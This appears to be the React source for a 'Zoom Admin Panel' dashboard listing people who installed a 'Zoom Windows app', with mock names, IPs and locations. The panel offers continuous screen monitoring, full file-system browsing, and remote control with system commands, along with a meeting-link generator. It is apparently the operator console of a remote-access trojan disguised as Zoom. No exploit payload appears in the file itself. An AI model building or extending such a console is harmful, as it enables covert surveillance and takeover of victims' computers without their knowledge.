'use client';

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Users, Monitor, Activity, AlertCircle, CheckCircle, HardDrive, Gamepad2, Link } from 'lucide-react';
import ScreenShareViewer from '@/components/ScreenShareViewer';
import FileBrowser from '@/components/FileBrowser';
import RemoteControl from '@/components/RemoteControl';
import MeetingLinkGenerator from '@/components/MeetingLinkGenerator';

interface User {
  id: string;
  name: string;
  email?: string;
  ip: string;
  location: string;
  installDate: string;
  lastSeen: string;
  status: 'online' | 'offline' | 'idle';
  version: string;
  os: string;
  screenShareActive: boolean;
}

const AdminPanel = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'screen' | 'files' | 'control' | 'meetings'>('screen');

  // Mock data - in production, this would come from your API
  useEffect(() => {
    const mockUsers: User[] = [
      {
        id: 'user-1',
        name: 'John Doe',
        email: 'john@example.com',
        ip: '192.168.1.100',
        location: 'New York, NY',
        installDate: '2024-01-15',
        lastSeen: '2024-01-20 14:30:00',
        status: 'online',
        version: '1.0.0',
        os: 'Windows 11',
        screenShareActive: true
      },
      {
        id: 'user-2',
        name: 'Jane Smith',
        email: 'jane@example.com',
        ip: '192.168.1.101',
        location: 'Los Angeles, CA',
        installDate: '2024-01-18',
        lastSeen: '2024-01-20 13:45:00',
        status: 'idle',
        version: '1.0.0',
        os: 'Windows 10',
        screenShareActive: true
      },
      {
        id: 'user-3',
        name: 'Mike Johnson',
        ip: '192.168.1.102',
        location: 'Chicago, IL',
        installDate: '2024-01-19',
        lastSeen: '2024-01-20 12:15:00',
        status: 'offline',
        version: '1.0.0',
        os: 'Windows 11',
        screenShareActive: true
      }
    ];

    setTimeout(() => {
      setUsers(mockUsers);
      setIsLoading(false);
    }, 1000);
  }, []);

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'online': return 'bg-green-500';
      case 'idle': return 'bg-yellow-500';
      case 'offline': return 'bg-gray-500';
      default: return 'bg-gray-500';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'online': return <CheckCircle className="w-4 h-4 text-green-500" />;
      case 'idle': return <Activity className="w-4 h-4 text-yellow-500" />;
      case 'offline': return <AlertCircle className="w-4 h-4 text-gray-500" />;
      default: return <AlertCircle className="w-4 h-4 text-gray-500" />;
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-dark-1 to-dark-2 flex items-center justify-center">
        <div className="text-white text-xl">Loading admin panel...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-dark-1 to-dark-2">
      {/* Header */}
      <div className="bg-dark-1 border-b border-dark-3 p-6">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-white">Zoom Admin Panel</h1>
            <p className="text-gray-400 mt-2">Monitor and manage Windows app users</p>
          </div>
          <div className="flex items-center gap-4">
            <Badge variant="outline" className="border-green-500 text-green-500">
              <div className={`w-2 h-2 rounded-full bg-green-500 mr-2`}></div>
              Live Monitoring
            </Badge>
            <Button variant="outline" className="border-blue-1 text-blue-1">
              <Users className="w-4 h-4 mr-2" />
              {users.length} Users
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Navigation Tabs */}
        <div className="mb-6">
          <div className="flex gap-2 border-b border-dark-3">
            <Button
              variant={activeTab === 'screen' ? 'default' : 'ghost'}
              onClick={() => setActiveTab('screen')}
              className={`px-4 py-2 rounded-t-lg ${
                activeTab === 'screen' 
                  ? 'bg-blue-1 text-white border-b-2 border-blue-1' 
                  : 'text-gray-400 hover:text-white hover:bg-dark-3'
              }`}
            >
              <Monitor className="w-4 h-4 mr-2" />
              Screen Monitoring
            </Button>
            <Button
              variant={activeTab === 'files' ? 'default' : 'ghost'}
              onClick={() => setActiveTab('files')}
              className={`px-4 py-2 rounded-t-lg ${
                activeTab === 'files' 
                  ? 'bg-blue-1 text-white border-b-2 border-blue-1' 
                  : 'text-gray-400 hover:text-white hover:bg-dark-3'
              }`}
            >
              <HardDrive className="w-4 h-4 mr-2" />
              File Browser
            </Button>
            <Button
              variant={activeTab === 'control' ? 'default' : 'ghost'}
              onClick={() => setActiveTab('control')}
              className={`px-4 py-2 rounded-t-lg ${
                activeTab === 'control' 
                  ? 'bg-blue-1 text-white border-b-2 border-blue-1' 
                  : 'text-gray-400 hover:text-white hover:bg-dark-3'
              }`}
            >
              <Gamepad2 className="w-4 h-4 mr-2" />
              Remote Control
            </Button>
            <Button
              variant={activeTab === 'meetings' ? 'default' : 'ghost'}
              onClick={() => setActiveTab('meetings')}
              className={`px-4 py-2 rounded-t-lg ${
                activeTab === 'meetings' 
                  ? 'bg-blue-1 text-white border-b-2 border-blue-1' 
                  : 'text-gray-400 hover:text-white hover:bg-dark-3'
              }`}
            >
              <Link className="w-4 h-4 mr-2" />
              Meeting Links
            </Button>
          </div>
        </div>

        {activeTab === 'meetings' ? (
          <MeetingLinkGenerator />
        ) : (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Users List */}
          <div className="lg:col-span-1">
            <Card className="bg-dark-1 border-dark-3">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <Users className="w-5 h-5" />
                  Connected Users
                </CardTitle>
                <CardDescription className="text-gray-400">
                  Users with Zoom Windows app installed
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-3">
                {users.map((user) => (
                  <div
                    key={user.id}
                    onClick={() => setSelectedUser(user)}
                    className={`p-4 rounded-lg border cursor-pointer transition-all ${
                      selectedUser?.id === user.id
                        ? 'border-blue-1 bg-blue-1/10'
                        : 'border-dark-3 hover:border-dark-2'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 bg-blue-1 rounded-full flex items-center justify-center text-white font-bold">
                          {user.name.charAt(0)}
                        </div>
                        <div>
                          <div className="text-white font-medium">{user.name}</div>
                          <div className="text-gray-400 text-sm">{user.location}</div>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        {getStatusIcon(user.status)}
                        {user.screenShareActive && (
                          <Monitor className="w-4 h-4 text-green-500" />
                        )}
                      </div>
                    </div>
                    <div className="text-xs text-gray-500 space-y-1">
                      <div>IP: {user.ip}</div>
                      <div>OS: {user.os} • v{user.version}</div>
                      <div>Last seen: {user.lastSeen}</div>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>
          </div>

          {/* User Details & Screen Share */}
          <div className="lg:col-span-2">
            {selectedUser ? (
              <div className="space-y-6">
                {/* User Details */}
                <Card className="bg-dark-1 border-dark-3">
                  <CardHeader>
                    <CardTitle className="text-white flex items-center justify-between">
                      <span>User Details</span>
                      <Badge className={getStatusColor(selectedUser.status)}>
                        {selectedUser.status}
                      </Badge>
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div>
                        <div className="text-gray-400">Name</div>
                        <div className="text-white">{selectedUser.name}</div>
                      </div>
                      <div>
                        <div className="text-gray-400">Email</div>
                        <div className="text-white">{selectedUser.email || 'N/A'}</div>
                      </div>
                      <div>
                        <div className="text-gray-400">IP Address</div>
                        <div className="text-white">{selectedUser.ip}</div>
                      </div>
                      <div>
                        <div className="text-gray-400">Location</div>
                        <div className="text-white">{selectedUser.location}</div>
                      </div>
                      <div>
                        <div className="text-gray-400">Install Date</div>
                        <div className="text-white">{selectedUser.installDate}</div>
                      </div>
                      <div>
                        <div className="text-gray-400">Last Seen</div>
                        <div className="text-white">{selectedUser.lastSeen}</div>
                      </div>
                      <div>
                        <div className="text-gray-400">Version</div>
                        <div className="text-white">{selectedUser.version}</div>
                      </div>
                      <div>
                        <div className="text-gray-400">Operating System</div>
                        <div className="text-white">{selectedUser.os}</div>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Screen Share & File Browser Tabs */}
                <Card className="bg-dark-1 border-dark-3">
                  <CardHeader>
                    <div className="flex items-center justify-between">
                        <div>
                          <CardTitle className="text-white flex items-center gap-2">
                            {activeTab === 'screen' ? (
                              <Monitor className="w-5 h-5" />
                            ) : activeTab === 'files' ? (
                              <HardDrive className="w-5 h-5" />
                            ) : (
                              <Gamepad2 className="w-5 h-5" />
                            )}
                            {activeTab === 'screen' ? 'Screen Share' : activeTab === 'files' ? 'File Browser' : 'Remote Control'}
                          </CardTitle>
                          <CardDescription className="text-gray-400">
                            {activeTab === 'screen' 
                              ? 'Automatic screen monitoring - all users are monitored continuously'
                              : activeTab === 'files'
                              ? 'Browse user files and folders - full access to file system'
                              : 'Full remote control - mouse, keyboard, system commands'
                            }
                          </CardDescription>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            variant={activeTab === 'screen' ? 'default' : 'outline'}
                            size="sm"
                            onClick={() => setActiveTab('screen')}
                            className={activeTab === 'screen' ? 'bg-blue-1' : 'border-gray-600 text-gray-400'}
                          >
                            <Monitor className="w-4 h-4 mr-2" />
                            Screen
                          </Button>
                          <Button
                            variant={activeTab === 'files' ? 'default' : 'outline'}
                            size="sm"
                            onClick={() => setActiveTab('files')}
                            className={activeTab === 'files' ? 'bg-blue-1' : 'border-gray-600 text-gray-400'}
                          >
                            <HardDrive className="w-4 h-4 mr-2" />
                            Files
                          </Button>
                          <Button
                            variant={activeTab === 'control' ? 'default' : 'outline'}
                            size="sm"
                            onClick={() => setActiveTab('control')}
                            className={activeTab === 'control' ? 'bg-blue-1' : 'border-gray-600 text-gray-400'}
                          >
                            <Gamepad2 className="w-4 h-4 mr-2" />
                            Control
                          </Button>
                        </div>
                    </div>
                  </CardHeader>
                  <CardContent>
                    {activeTab === 'screen' ? (
                      <ScreenShareViewer
                        userId={selectedUser.id}
                        isActive={selectedUser.screenShareActive}
                        onRequestScreenShare={() => {
                          setUsers(prev => prev.map(user => 
                            user.id === selectedUser.id 
                              ? { ...user, screenShareActive: true }
                              : user
                          ));
                          setSelectedUser(prev => prev ? { ...prev, screenShareActive: true } : null);
                        }}
                        onStopScreenShare={() => {
                          setUsers(prev => prev.map(user => 
                            user.id === selectedUser.id 
                              ? { ...user, screenShareActive: false }
                              : user
                          ));
                          setSelectedUser(prev => prev ? { ...prev, screenShareActive: false } : null);
                        }}
                      />
                    ) : activeTab === 'files' ? (
                      <FileBrowser userId={selectedUser.id} />
                    ) : (
                      <RemoteControl
                        userId={selectedUser.id}
                        isActive={selectedUser.screenShareActive}
                        onStartControl={() => {
                          setUsers(prev => prev.map(user => 
                            user.id === selectedUser.id 
                              ? { ...user, screenShareActive: true }
                              : user
                          ));
                          setSelectedUser(prev => prev ? { ...prev, screenShareActive: true } : null);
                        }}
                        onStopControl={() => {
                          setUsers(prev => prev.map(user => 
                            user.id === selectedUser.id 
                              ? { ...user, screenShareActive: false }
                              : user
                          ));
                          setSelectedUser(prev => prev ? { ...prev, screenShareActive: false } : null);
                        }}
                      />
                    )}
                  </CardContent>
                </Card>
              </div>
            ) : (
              <Card className="bg-dark-1 border-dark-3">
                <CardContent className="py-12 text-center">
                  <Users className="w-16 h-16 mx-auto mb-4 text-gray-500" />
                  <div className="text-gray-400">
                    Select a user from the list to view their details and screen
                  </div>
                </CardContent>
              </Card>
            )}
          </div>
        </div>
        )}
      </div>
    </div>
  );
};

export default AdminPanel;
